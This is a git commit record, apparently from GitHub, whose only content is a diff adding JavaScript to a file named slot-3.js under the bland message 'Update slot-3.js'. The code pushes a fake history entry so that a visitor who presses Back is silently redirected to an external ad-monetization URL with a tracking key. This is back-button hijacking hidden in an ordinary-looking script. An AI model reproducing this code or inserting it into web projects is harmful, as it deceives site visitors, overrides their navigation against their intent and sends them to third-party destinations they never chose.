9336c413a195ad26139daff366ae4d84c2339270
Hafith <88893624+Hafith@users.noreply.github.com>
2021-11-22 00:18:05 +0700

    Update slot-3.js

--- slot-3.js
+++ slot-3.js
@@ -1,1 +1,14 @@
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("https://www.effectivegatetocontent.com/am3fc3kdt5?key=54a2368844e0b04ab35c9193c1fd1a2a");
+    },10);
+  }
+}, false);
+}(window, location));
 
